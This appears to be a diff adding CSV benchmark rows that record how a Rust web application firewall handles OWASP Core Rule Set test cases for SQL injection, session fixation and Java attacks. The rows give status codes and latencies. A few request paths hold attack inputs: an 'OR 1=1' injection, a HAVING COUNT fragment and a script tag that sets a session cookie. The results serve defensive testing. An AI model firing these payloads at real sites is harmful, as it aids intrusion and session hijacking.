+rust,942521,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942521.yaml,1,POST,/post,10,1.08,403,0,200,1,53.7,74.24,110.37,403:8,
+rust,942522,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942522.yaml,1,POST,/post,12,1.11,403,0,200,1,44.6,89.3,128.78,403:8,
+rust,942101,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942101.yaml,1,POST,/post/1234%20OR%201=1,0,1.13,403,0,200,1,54.6,72.42,108.76,403:8,
+rust,942152,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942152.yaml,1,GET,/get,0,1.01,403,0,200,1,45.2,73.37,110.61,403:8,
+rust,942321,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942321.yaml,1,GET,/get,0,1.12,403,0,200,1,51.9,75.04,113.68,403:8,
+rust,942015,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942016,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942251,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942251.yaml,1,GET,/get?var=%20HAVING%20COUNT%28CustomerID%29%20%3E%205,0,1.16,403,0,200,1,52.9,75.21,111.89,403:8,
+rust,942490,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942490.yaml,1,POST,/post,22,1.1,403,0,200,1,45.2,74.02,140.7,403:8,
+rust,942420,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942420.yaml,5,POST,/post,0,1.06,200,0,,0,,,,,target rule not proven
+rust,942431,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942431.yaml,5,POST,/post,22,1.09,200,0,,0,,,,,target rule not proven
+rust,942460,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942460.yaml,1,POST,/post,11,1.11,200,0,,0,,,,,target rule not proven
+rust,942511,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942511.yaml,2,GET,/get?'bla',0,1.12,403,0,200,1,53.7,73.73,111.25,403:8,
+rust,942530,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942530.yaml,1,POST,/post,38,1.09,403,0,200,1,51.8,76.04,113.11,403:8,
+rust,942017,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942018,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,,,,,,,,,,,,,,,no usable official request case
+rust,942421,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942421.yaml,3,GET,/get,0,1.14,200,0,,0,,,,,target rule not proven
+rust,942432,REQUEST-942-APPLICATION-ATTACK-SQLI.conf,942432.yaml,3,POST,/post,18,1.03,200,0,,0,,,,,target rule not proven
+rust,943011,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943012,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943100,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,943100.yaml,1,GET,"/get/foo.php?bar=blah<script>document.cookie=""sessionid=1234;%20domain=.example.dom"";</script>",0,0.71,403,0,200,1,53.5,73.29,109.1,403:8,
+rust,943110,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,943110.yaml,1,GET,/get/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666,0,0.74,403,0,200,1,50.0,79.75,121.24,403:8,
+rust,943120,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,943120.yaml,1,GET,/get/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666,0,0.73,403,0,200,1,53.1,73.13,111.37,403:8,
+rust,943013,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943014,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943015,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943016,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943017,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,943018,REQUEST-943-APPLICATION-ATTACK-SESSION-FIXATION.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944011,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944012,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944100,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944100.yaml,1,POST,/post,22,0.99,403,0,200,1,53.4,74.42,111.1,403:8,
+rust,944110,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944110.yaml,1,POST,/post,17,0.69,403,0,200,1,44.8,72.34,140.13,403:8,
+rust,944120,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944120.yaml,1,POST,/post,41,0.98,403,0,200,1,44.9,75.59,112.63,403:8,
+rust,944130,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944130.yaml,1,POST,/post,28,1.03,403,0,200,1,51.8,76.93,113.68,403:8,
+rust,944140,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944140.yaml,2,GET,/get/upload1,0,1.03,403,0,200,1,44.9,71.77,140.63,403:8,
+rust,944150,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944150.yaml,1,POST,/post,36,0.7,403,0,200,1,44.7,76.77,112.27,403:8,
+rust,944013,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944014,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944151,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944151.yaml,1,POST,/post,36,0.99,403,0,200,1,51.9,76.24,113.7,403:8,
+rust,944200,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944210,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944210.yaml,1,POST,/post,11,0.71,403,0,200,1,44.8,77.99,113.41,403:8,
+rust,944240,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944240.yaml,1,POST,/post,29,0.98,403,0,200,1,50.6,76.13,115.26,403:8,
+rust,944250,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944250.yaml,1,POST,/post,22,1.05,403,0,200,1,42.4,78.81,120.45,403:8,
+rust,944260,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944260.yaml,1,POST,/post,144,0.72,403,0,200,1,51.7,74.83,111.89,403:8,
+rust,944015,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944016,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944300,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944300.yaml,1,POST,/post,15,0.68,403,0,200,1,51.9,76.62,113.14,403:8,
+rust,944017,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944018,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,,,,,,,,,,,,,,,no usable official request case
+rust,944152,REQUEST-944-APPLICATION-ATTACK-JAVA.conf,944152.yaml,1,POST,/post,36,1.04,403,0,200,1,44.9,75.04,111.99,403:8,
